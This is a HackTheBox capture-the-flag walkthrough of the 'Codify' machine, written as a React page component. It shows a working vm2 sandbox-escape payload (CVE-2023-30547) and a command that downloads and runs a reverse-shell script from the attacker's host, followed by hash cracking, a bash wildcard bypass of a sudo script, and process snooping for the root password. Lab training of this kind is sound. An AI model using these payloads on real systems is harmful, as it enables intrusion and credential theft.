import React from 'react';

// Import placeholder images - replace with actual screenshots
import codifyLogo from "../../assets/codify/logo.jpg"
import hdbBanner from "../../assets/cyber/hdb.png"

import nmapScan from "../../assets/codify/nmap-scan.png"
import webPage from "../../assets/codify/webpage.png"
import sandboxPage from "../../assets/codify/sandbox-page.png"
import aboutPage from "../../assets/codify/about-page.png"
import vm2Version from "../../assets/codify/vm2-version.png"

import reverseShell from "../../assets/codify/reverse-shell.png"


import contactDir from "../../assets/codify/contact-dir.png"
import passwdFile from "../../assets/codify/passwd-file.png"

import sudoList from "../../assets/codify/sudo-list.png"
import backupScript from "../../assets/codify/backup-script.png"
import mysqlQuery from "../../assets/codify/mysql-query.png"
import bypassTest from "../../assets/codify/bypass-test.png"
import psypOutput from "../../assets/codify/pspy-output.png"
import rootShell from "../../assets/codify/root-shell.png"

const Codify = () => {
    const scrollToSection = (sectionId) => {
        const element = document.getElementById(sectionId);
        if (element) {
            element.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
    };

    return(
        <div className="w-[100%] bg p-10 flex flex-col justify-center items-center">
                
            <div className="w-[80%] relative bg border-[3px] p-10 flex flex-col items-center rounded bg-[rgba(255,255,255,0.1)]">
                <div className="absolute border right-0 top-0" style={{borderBottomLeftRadius:10}}>
                    <h3 className="text-white p-2 text-[5px] md:text-[12px] md:p-3">Created at: <span className="opacity-80">7/08/2025</span></h3>
                </div>
                <h2 className="text-white text-[30px] md:text-[50px]">Codify</h2>
                <h2 className="text-white text-[10px] opacity-80 font-thin text-center md:text-[20px]">Welcome to Codify, a fascinating challenge that demonstrates the dangers of code sandboxes and privilege escalation through misconfigured scripts. Explore vm2 sandbox escape vulnerabilities, database enumeration techniques, and bash script exploitation. This box showcases how seemingly secure environments can be compromised through careful analysis and creative thinking!</h2>
                
                <div className="flex flex-wrap justify-center gap-2 mt-4">
                    {["vm2 sandbox escape", "CVE-2023-30547", "sqlite enumeration", "hash cracking", "sudo privileges", "bash script exploitation", "process spoofing"].map((tag, index) => (
                        <span key={index} className="bg-[rgba(255,255,255,0.2)] text-white px-3 py-1 rounded-full text-xs md:text-sm border border-white/30">
                            {tag}
                        </span>
                    ))}
                </div>
            </div>
            
            
            <div className="w-[80%] bg  p-10 flex flex-col items-center rounded ">
                <img className="relative w-[80%]  border-[2px]" src={codifyLogo} alt="codify landing page" />
                <img className="relative w-[80%] border-[2px]" src={hdbBanner} alt="htb banner" />
            </div>

            
              <div className="relative align-center left-0 right-0 z-50 opacity-100  w-[60%] rounded  backdrop-blur-md border-bold md:mb-[-55px]">
                <div className="max-w-6xl mx-auto px-4 py-3">
                    <div className="flex items-center justify-between">
                        <div className="text-white font-semibold text-lg">
                            Codify HTB
                        </div>
                        <nav className="hidden md:flex items-center space-x-6 md:px-10">
                            <button 
                                onClick={() => scrollToSection('overview')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Overview
                            </button>
                            <button 
                                onClick={() => scrollToSection('enumeration')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Enumeration
                            </button>
                            <button 
                                onClick={() => scrollToSection('foothold')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Foothold
                            </button>
                            <button 
                                onClick={() => scrollToSection('privilege-escalation')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Privesc
                            </button>
                            <button 
                                onClick={() => scrollToSection('takeaway')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Takeaway
                            </button>
                        </nav>
                        
                        {/* Mobile Menu Button */}
                        <div className="md:hidden">
                            <button 
                                id="mobile-menu-btn"
                                onClick={() => {
                                    const menu = document.getElementById('mobile-menu');
                                    menu.classList.toggle('hidden');
                                }}
                                className="text-white hover:bg-white/10 p-2 rounded"
                            >
                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
                                </svg>
                            </button>
                        </div>
                    </div>
                    
                    {/* Mobile Menu */}
                    <div id="mobile-menu" className="hidden md:hidden mt-3 pb-3 border-t border-white/10 pt-3">
                        <div className="flex flex-col space-y-2">
                            <button 
                                onClick={() => {
                                    scrollToSection('overview');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Overview
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('enumeration');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Enumeration
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('foothold');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Foothold
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('privilege-escalation');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Privesc
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('takeaway');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Takeaway
                            </button>
                        </div>
                    </div>
                </div>
                </div>
          

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="enumeration" className="w-[100%] flex flex-col items-center mt-20">
                <h1 className="text-white text-[25px] font-medium md:text-[40px]">Enumeration</h1>
                
                <div className="w-[80%] mt-8 text-white md:mt-[80px]">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Let's start our box with the usual <span className="text-yellow-400">nmap</span> scan
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            export RHOST=10.10.11.239
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo nmap -sVC $RHOST -oN ./nmap/scan.txt -p-
                        </code>
                    </div>
                    
                    <img className="w-full border-[2px] relative border-white/30 rounded mb-6" src={nmapScan} alt="nmap scan results" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We see that it's hosting a webapp with the domain of <span className="text-blue-400">codify.htb</span>. Let's put it into the <span className="text-yellow-400">/etc/hosts</span> file for DNS resolution and visit the website
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo sh -c 'echo "10.10.11.239 codify.htb" >> /etc/hosts'
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            firefox http://$RHOST
                        </code>
                    </div>
                    
                    <img className="w-[70%] m-auto relative border-[2px] border-white/30 rounded mb-6" src={webPage} alt="codify webpage" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Upon visit we see a code sandbox environment, which kinda implies our initial attack vector - <span className="text-red-400 font-semibold">RCE with javascript</span>. After trying many easy wins like system execution with <span className="text-yellow-400">child_process</span> all of them failed so it was obvious that I'm missing something
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={sandboxPage} alt="sandbox page" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        The next step for me was to find out the technology that the website was running for the <span className="text-blue-400">sandbox</span> feature. In the <span className="text-orange-400">About</span> page I found a crucial information
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={aboutPage} alt="about page" />
                    
                    <img className="w-[60%] m-auto relative border-[2px] border-white/30 rounded mb-6" src={vm2Version} alt="vm2 version" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now we have the technology and the matching version. After a quick google search I found that <span className="text-red-400">vm2 3.9.15</span> has a vulnerability <span className="text-red-400 font-semibold">CVE-2023-30547</span>, where an attacker can escape the sandbox to execute system commands. Perfect exactly what I was searching for.
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        <span className="text-yellow-400 font-semibold">The exploit in a nutshell:</span>
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90 italic">
                        There exists a vulnerability in source code transformer (exception sanitization logic) of vm2 for versions up to 3.9.15, allowing attackers to bypass handleException() and leak unsanitized host exceptions which can be used to escape the sandbox and run arbitrary code in host context.
                    </p>
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="foothold" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[25px] font-medium md:text-[40px] md:mb-5">Foothold</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Based on this I got this payload to get a <span className="text-red-400">reverse shell</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6 overflow-x-auto">
                        <pre className="text-green-400 text-xs md:text-sm">
{`const {VM} = require("vm2");
const vm = new VM();

const code = \`
aVM2_INTERNAL_TMPNAME = {};
function stack() {
 new Error().stack;
 stack();
}
try {
 stack();
} catch (a$tmpname) {
 a$tmpname.constructor.constructor('return process')().mainModule.require('child_process').exec('[PUT-RCE-HERE]');
}
\`

console.log(vm.run(code));`}
                        </pre>
                    </div>
                    
                    <p className="text-sm md:text-base mb-4 opacity-90">1. First I hosted a reverse shell on my machine to sneak into the victim server</p>
                    <p className="text-sm md:text-base mb-4 opacity-90">Replaced the <span className="text-red-400">[PUT-RCE-HERE]</span></p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            wget http://10.10.14.11:8001/bash_1.sh
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-4 opacity-90">2. Then I ran the exploit</p>
                    <p className="text-sm md:text-base mb-4 opacity-90">Replaced the <span className="text-red-400">[PUT-RCE-HERE]</span></p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            chmod +x bash_1.sh && ./bash_1.sh
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Before we press <span className="text-yellow-400">RUN</span> lets listen
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            nc -lvnp 9443
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And there we go we have a shell as <span className="text-green-400">svc</span>
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={reverseShell} alt="reverse shell" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Pretty basic shell so before we move on to <span className="text-yellow-400">Priv-Esc</span> lets upgrade the shell
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <pre className="text-green-400 text-sm">
{`# In your reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background
# On your attacking machine:
stty raw -echo; fg
# Press Enter twice, then:
export TERM=xterm
export SHELL=/bin/bash`}
                        </pre>
                    </div>
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="privilege-escalation" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[30px] font-medium md:text-[40px]">Privilege Escalation Part 1</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Doing my usual manual enumeration landed me to a very interesting file in <span className="text-blue-400">/var/www/contact</span>. Here I found a database file <span className="text-yellow-400">tickets.db</span>
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={contactDir} alt="contact directory" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Let's enumerate it with <span className="text-blue-400">sqlite3</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sqlite3 tickets.db
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            .tables
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We see a table called <span className="text-yellow-400">users</span> which I want to enumerate further
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            SELECT * FROM users;
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        It shows us credentials for a user called <span className="text-yellow-400">joshua</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
                        </code>
                    </div>
                    
                    
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        To confirm that this user is a user on the machine and an option for ssh I checked it in the <span className="text-blue-400">/etc/passwd</span> and it show it is !
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            cat /etc/passwd
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={passwdFile} alt="passwd file" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        So the next step is trying to crack this password with hashcat. First lets identify the hash
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            hashid -m hash.txt
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        It shows that its a <span className="text-red-400">Blowfish</span> hash. So let's get cracking
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-green-500/50 mb-6">
                        <code className="text-green-400 text-sm">
                            Blowfish(OpenBSD) [Hashcat Mode: 3200]
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        and we got the password - <span className="text-green-400">joshua:spongebob1</span>
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Trying this with ssh gets us in as <span className="text-yellow-400">joshua</span> !
                    </p>
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[20px] font-medium md:text-[40px]">Privilege Escalation Part 2</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        The first thing I checked as <span className="text-yellow-400">joshua</span> already gave away the most prevalent attack vector for me with:
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo -l
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={sudoList} alt="sudo list" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Which means we can run <span className="text-red-400">/opt/scripts/mysql-backup.sh</span> as root without root password. Reading this executable seems to be a script to backup the mysql database. When executing it ask root's password and if the password doesn't match the password in the database it won't execute. Or it seems ! Because there is just a bash variable passed in on the right side as <span className="text-yellow-400">$USER_PASS</span> but its not in strings which means it will just check weather there is a <span className="text-blue-400">pattern</span>. This is huge because we can also see that the only time the program uses our input is for validation but after it uses the password within the database. Also have to be careful in our vectors because even if we bypass the password check we would still need root access to get to the backup database !
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={backupScript} alt="backup script" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        At this point there are millions of ideas how could I go about exploiting this script. The first thing was to see for patterns of the user password. Replicating the database command in this with our user <span className="text-yellow-400">joshua</span> allows us to see the root user's <span className="text-red-400">MySQL</span> password hash.
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <pre className="text-green-400 text-sm">
{`/usr/bin/mysql -u "joshua" -h 0.0.0.0 -P 3306 -p"spongebob1"
show databases;
use mysql;
SELECT * FROM user\\G;`}
                        </pre>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={mysqlQuery} alt="mysql query" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        I've tried cracking this hash with hashcat but it did not work ! So moving on I remembered that for us to bypass the if statement we would just have to be right about the pattern. This means if we only type
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            *
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        As password it would bypass the if statement and execute the backup successfully
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And it does !!
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={bypassTest} alt="bypass test" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        However for now it seems it gets us nowhere. But if we look carefully there is a warning. The warning suggest that the password should be a <span className="text-yellow-400">plaintext</span> in the terminal command execution.
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        So lets do Terminal Process Spoofing to read the command execution on the system with <span className="text-blue-400">pspy</span>. I navigated to tmp and downloaded pspy and ran it
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            ./pspy64 -p
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Then from another ssh terminal process with <span className="text-yellow-400">joshua</span> again I executed the backup binary with the <span className="text-red-400">*</span> bypass. And it shows root's password in clear text !!
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={psypOutput} alt="pspy output" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now lets switch user to root with <span className="text-green-400">kljh12k3jhaskjh12kjh3</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            su root
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={rootShell} alt="root shell" />
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="takeaway" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[20px] font-medium md:text-[30px]">Takeaway</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <div className="bg-[rgba(255,255,255,0.1)] p-6 rounded border border-white/30">
                        <h3 className="text-lg mb-4 text-yellow-400">Key Learning Points:</h3>
                        <ul className="space-y-2 text-sm md:text-base opacity-90">
                            <li>• <span className="text-red-400">Sandbox Escapes:</span> VM2 library versions up to 3.9.15 are vulnerable to CVE-2023-30547, allowing attackers to escape sandboxed environments</li>
                            <li>• <span className="text-blue-400">Database Enumeration:</span> SQLite databases in web applications often contain valuable user credentials and password hashes</li>
                            <li>• <span className="text-yellow-400">Hash Identification:</span> Proper hash identification is crucial - Blowfish hashes can be cracked using hashcat mode 3200</li>
                            <li>• <span className="text-green-400">Sudo Misconfiguration:</span> Scripts running with sudo privileges should be carefully audited for vulnerabilities</li>
                            <li>• <span className="text-purple-400">Bash Pattern Matching:</span> Unquoted variables in bash comparisons can lead to pattern matching bypasses using wildcards</li>
                            <li>• <span className="text-orange-400">Process Monitoring:</span> Tools like pspy can reveal sensitive information in command-line arguments during script execution</li>
                            <li>• <span className="text-cyan-400">Command Injection Prevention:</span> Passwords and sensitive data should never be passed as command-line arguments in plaintext</li>
                        </ul>
                        
                        <h3 className="text-lg mt-6 mb-4 text-yellow-400">Tools Mastered:</h3>
                        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-green-400">nmap</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-red-400">hashcat</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-blue-400">sqlite3</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-yellow-400">mysql</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-purple-400">pspy</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-orange-400">ssh tunneling</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-cyan-400">netcat</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-pink-400">node.js</span>
                            </div>
                        </div>
                        
                        <div className="mt-6 p-4 bg-[rgba(255,0,0,0.1)] border border-red-400/50 rounded">
                            <p className="text-red-300 text-sm">
                                <strong>Security Insight:</strong> This box perfectly demonstrates the importance of secure coding practices in both sandbox environments and system administration scripts. 
                                The vm2 vulnerability shows how even seemingly secure sandboxes can be compromised, while the bash script exploitation highlights the dangers of 
                                improper input validation and insecure credential handling in privileged scripts.
                            </p>
                        </div>
                        
                        <div className="mt-4 p-4 bg-[rgba(0,255,0,0.1)] border border-green-400/50 rounded">
                            <p className="text-green-300 text-sm">
                                <strong>Defensive Recommendations:</strong> Always keep sandbox libraries updated, implement proper input validation in scripts, 
                                avoid passing sensitive data via command-line arguments, and regularly audit sudo privileges and script permissions.
                            </p>
                        </div>
                    </div>
                </div>
            </div>
            
            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />
            
       
        </div>
    )
}

export default Codify;